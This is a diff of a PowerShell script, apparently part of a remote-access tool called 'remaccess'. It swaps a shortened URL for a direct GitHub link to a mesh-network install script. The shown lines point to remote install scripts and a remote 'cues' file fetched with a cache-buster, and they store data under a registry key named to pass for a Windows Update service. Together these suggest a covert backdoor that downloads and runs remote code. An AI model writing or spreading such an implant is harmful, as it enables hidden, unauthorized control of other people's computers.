@@ -15,7 +15,7 @@ $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/raw-ssh-install"
-$ztinstall = "https://tinyurl.com/ztinstall"
+$ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
 $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
 $programDataPath = $env:ProgramData
 $storedData = (Get-ItemProperty -Path $regPath).Data
